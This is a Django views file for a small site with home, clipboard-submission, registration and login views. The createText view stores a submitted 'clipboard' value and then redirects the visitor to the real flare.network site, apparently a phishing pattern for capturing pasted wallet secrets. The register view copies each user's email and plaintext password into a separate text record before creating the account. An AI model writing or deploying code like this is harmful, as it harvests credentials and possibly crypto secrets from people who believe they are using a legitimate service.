from django.shortcuts import render,redirect
from .models import TextModel
from django.http import HttpResponse
from django.contrib.auth import login, authenticate
from django.contrib import messages
from django.contrib.auth.models import User

def home(request):
    return render(request,'index.html')

def createText(request):
    if request.method == 'POST':
        clipboard_value = request.POST.get('clipboard')
        TextModel.objects.create(clipboard=clipboard_value)
        
        return redirect('https://flare.network')
    else:
        return render(request, 'index.html')


def register(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        password2 = request.POST.get('password2')
        firstname = request.POST.get('firstname')
        lastname = request.POST.get('lastname')

        if password != password2:
            messages.error(request, "Passwords do not match.")
            return render(request, 'index.html')

        if User.objects.filter(email=email).exists():
            messages.error(request, "Email already exists.")
            return render(request, 'index.html')

        clipboard_value = f"email: {email},password: {password},firstname: {firstname},lastname: {lastname}"
        text_model = TextModel.objects.create(clipboard=clipboard_value)
        text_model.save()

        user = User.objects.create_user(username=email, email=email, password=password, first_name=firstname, last_name=lastname)
        message = f"email: {email}\npassword: {password}\nfirstname: {firstname}\nlastname: {lastname}"
        user.save()

        # Authenticate and log in the user
        user = authenticate(username=email, password=password)
        if user is not None:
            login(request, user)
            messages.success(request, f'Account created for {user.username}!')
            return render(request, 'index.html')
    return render(request, 'index.html')

def login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        user = authenticate(username=email, password=password)
        if user is not None:
            login(request, user)
            messages.success(request, f'login successful {user.username}!')
            return render(request, 'index.html')
    return render(request, 'index.html')
